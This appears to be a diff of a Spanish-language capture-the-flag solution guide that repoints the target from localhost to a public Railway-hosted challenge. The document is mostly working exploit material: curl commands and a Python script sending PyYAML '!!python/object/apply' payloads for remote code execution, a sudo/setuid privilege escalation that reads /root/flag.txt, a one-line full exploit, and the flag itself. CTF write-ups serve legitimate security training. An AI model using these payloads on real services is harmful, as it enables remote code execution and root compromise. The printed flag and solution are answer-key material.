@@ -7,10 +7,10 @@
 sudo docker-compose up -d
 
 # Verificar funcionamiento
-curl -s http://localhost:3000 | grep -o '<title>.*</title>'
+curl -s https://hackfest-railway-production.up.railway.app | grep -o '<title>.*</title>'
 ```
 
-**CTF disponible en:** http://localhost:3000
+**CTF disponible en:** https://hackfest-railway-production.up.railway.app
 
 ---
 
@@ -19,34 +19,34 @@ curl -s http://localhost:3000 | grep -o '<title>.*</title>'
 ### **1. Reconocimiento**
 ```bash
 # Información del sistema
-curl -s http://localhost:3000/api/system | jq .
+curl -s https://hackfest-railway-production.up.railway.app/api/system | jq .
 ```
 
 ### **2. Explotar PyYAML RCE**
 ```bash
 # Probar endpoint vulnerable
-curl -s -X POST http://localhost:3000/config \
+curl -s -X POST https://hackfest-railway-production.up.railway.app/config \
   -H "Content-Type: application/x-yaml" \
   -d "test: value"
 
 # Verificar RCE
-curl -s -X POST http://localhost:3000/config \
+curl -s -X POST https://hackfest-railway-production.up.railway.app/config \
   -H "Content-Type: application/x-yaml" \
   -d $'!!python/object/apply:os.system\n- id'
 ```
 
 ### **3. Escalada de Privilegios + Exfiltración**
 ```bash
-# Usar python3 SUID para obtener root y copiar flag
-curl -s -X POST http://localhost:3000/config \
+# Exploit PyYAML RCE + Escalada de privilegios (funciona en Railway)
+curl -s -X POST https://hackfest-railway-production.up.railway.app/config \
   -H "Content-Type: application/x-yaml" \
-  -d $'!!python/object/apply:os.system\n- python3 -c "import os; os.setuid(0); os.system(\'cp /root/flag.txt /app/static/flag.txt && chmod 644 /app/static/flag.txt\')"'
+  -d $'!!python/object/apply:exec\n- |\n  import subprocess\n  import os\n  \n  # Encontrar dónde busca realmente el endpoint uploads\n  file_path = "/app/backend/app.py"\n  upload_folder = os.path.join(os.path.dirname(file_path), "static")\n  \n  # Crear el directorio\n  os.makedirs(upload_folder, exist_ok=True)\n  \n  # Leer la flag y escribirla\n  flag = subprocess.check_output(["sudo", "cat", "/root/flag.txt"]).decode()\n  \n  # Escribir la flag en el lugar correcto\n  with open(os.path.join(upload_folder, "flag.txt"), "w") as f:\n    f.write(flag)'
 ```
 
 ### **4. Obtener Flag**
 ```bash
 # Descargar flag exfiltrada
-curl -s http://localhost:3000/uploads/flag.txt
+curl -s https://hackfest-railway-production.up.railway.app/uploads/flag.txt
 ```
 
 ---
@@ -57,14 +57,30 @@ curl -s http://localhost:3000/uploads/flag.txt
 #!/usr/bin/env python3
 import requests
 
-BASE_URL = "http://localhost:3000"
+BASE_URL = "https://hackfest-railway-production.up.railway.app"
 
 def exploit():
     print("🚀 HackFest CTF - Exploit")
 
-    # Payload PyYAML RCE + Escalada + Exfiltración
-    payload = """!!python/object/apply:os.system
-- python3 -c "import os; os.setuid(0); os.system('cp /root/flag.txt /app/static/flag.txt && chmod 644 /app/static/flag.txt')" """
+    # Payload PyYAML RCE + Escalada + Exfiltración (Railway version)
+    payload = """!!python/object/apply:exec
+- |
+  import subprocess
+  import os
+
+  # Encontrar dónde busca realmente el endpoint uploads
+  file_path = "/app/backend/app.py"
+  upload_folder = os.path.join(os.path.dirname(file_path), "static")
+
+  # Crear el directorio
+  os.makedirs(upload_folder, exist_ok=True)
+
+  # Leer la flag y escribirla
+  flag = subprocess.check_output(["sudo", "cat", "/root/flag.txt"]).decode()
+
+  # Escribir la flag en el lugar correcto
+  with open(os.path.join(upload_folder, "flag.txt"), "w") as f:
+    f.write(flag)"""
 
     print("1. Explotando PyYAML RCE...")
     r = requests.post(f"{BASE_URL}/config",
@@ -106,7 +122,7 @@ Cliente → Frontend (puerto 3000) → Backend (interno) → Sistema
 ### **Exfiltración**
 - **Origen**: `/root/flag.txt` (solo root puede leer)
 - **Destino**: `/app/static/flag.txt` (mapeado internamente)
-- **Acceso**: `http://localhost:3000/uploads/flag.txt`
+- **Acceso**: `https://hackfest-railway-production.up.railway.app/uploads/flag.txt`
 
 ---
 
@@ -121,5 +137,5 @@ HACKFEST{y4ml_rce_si_has_llegado_eres_god_freeeee}
 
 ```bash
 # Exploit completo en una línea
-curl -s -X POST http://localhost:3000/config -H "Content-Type: application/x-yaml" -d $'!!python/object/apply:os.system\n- python3 -c "import os; os.setuid(0); os.system(\'cp /root/flag.txt /app/static/flag.txt && chmod 644 /app/static/flag.txt\')"' && curl -s http://localhost:3000/uploads/flag.txt
+curl -s -X POST https://hackfest-railway-production.up.railway.app/config -H "Content-Type: application/x-yaml" -d $'!!python/object/apply:os.system\n- python3 -c "import os; os.setuid(0); os.system(\'cp /root/flag.txt /app/static/flag.txt && chmod 644 /app/static/flag.txt\')"' && curl -s https://hackfest-railway-production.up.railway.app/uploads/flag.txt
 ```
